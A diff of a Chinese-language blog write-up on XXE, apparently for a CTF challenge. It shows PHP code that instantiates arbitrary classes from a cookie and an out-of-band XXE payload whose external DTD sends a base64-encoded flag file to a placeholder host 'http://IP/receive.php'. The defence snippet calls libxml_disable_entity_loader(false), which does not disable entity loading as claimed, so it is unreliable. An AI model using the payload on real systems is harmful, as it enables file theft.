-  <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;theme&#39;</span><span class="p">])</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;Black&#34;</span><span class="p">,</span> <span class="s2">&#34;Green&#34;</span><span class="p">]))</span> <span class="p">{</span>
-      <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$_</span><span class="p">))</span> <span class="p">{</span>
-        <span class="p">(</span><span class="nv">$string</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;string&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$string</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-        <span class="p">(</span><span class="nv">$default</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;default&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-        <span class="p">(</span><span class="nv">$keyword</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;keyword&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$keyword</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-
-        <span class="k">new</span> <span class="nv">$_</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;store&#39;</span><span class="p">]);</span>
-      <span class="p">}</span>
-    <span class="p">}</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;theme&#39;</span><span class="p">])</span> <span class="p">{</span>
-    <span class="nv">$args</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
-      <span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;info&#39;</span><span class="p">])</span> <span class="p">{</span>
-    <span class="nx">phpinfo</span><span class="p">();</span>
-  <span class="p">}</span>
-
-  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$cls</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="nv">$cls</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">class</span> <span class="nc">Black</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.string&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.default&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$keyword</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.keyword&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;theme&#39;</span><span class="p">,</span> <span class="s2">&#34;Black-&#34;</span><span class="o">.</span><span class="nv">$string</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$default</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$keyword</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">class</span> <span class="nc">Green</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.string&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.default&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$keyword</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.keyword&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;theme&#39;</span><span class="p">,</span> <span class="s2">&#34;Green-&#34;</span><span class="o">.</span><span class="nv">$string</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$default</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$keyword</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;theme&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;Black&#34;</span><span class="p">,</span> <span class="s2">&#34;Green&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$_</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$string</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;string&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$string</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$default</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;default&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$keyword</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;keyword&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$keyword</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="nv">$_</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;store&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;theme&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;info&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到在根据 cookie 加载主题类的地方没有判断 cookie 是否被篡改，导致我们可以实例化任意类 <code>new $args[0]($args[1], $args[2], $args[3], '');</code>。</p>
 <p>寻找内置的 php 原生类，且该类的实例化参数要与 <code>$args[0]($args[1], $args[2], $args[3], '')</code> 相对应，类 <code>SimpleXMLElement</code> 符合上述要求。</p>
@@ -633,15 +631,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///flag&#34;&gt;
-&lt;!ENTITY % remote SYSTEM &#34;http://IP/xxe.dtd&#34;&gt;
-%remote;
-%all;
-]&gt;
-&lt;foo&gt;&amp;send;&lt;/foo&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE foo [
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:///flag&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % remote SYSTEM &#34;http://IP/xxe.dtd&#34;&gt;
+</span></span><span class="line"><span class="cl">%remote;
+</span></span><span class="line"><span class="cl">%all;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;foo&gt;&amp;send;&lt;/foo&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>xxe.dtd</p>
 <div class="highlight"><div class="chroma">
@@ -649,8 +647,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&#34;&lt;!ENTITY send SYSTEM &#39;http://IP/receive.php?file=%file;&#39;&gt;&#34;</span><span class="k">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="line"><span class="cl"><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&#34;&lt;!ENTITY send SYSTEM &#39;http://IP/receive.php?file=%file;&#39;&gt;&#34;</span><span class="k">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5-防御">5 防御</h2>
 <p>使用开发语言提供的禁用外部实体的方法</p>
@@ -662,10 +660,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">libxml_disable_entity_loader</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">libxml_disable_entity_loader</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>过滤用户提交的 XML 数据，如关键字 SYSTEM、 PUBLIC 等。</p>
 </div><div class="post-footer" id="post-footer">
@@ -696,7 +694,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
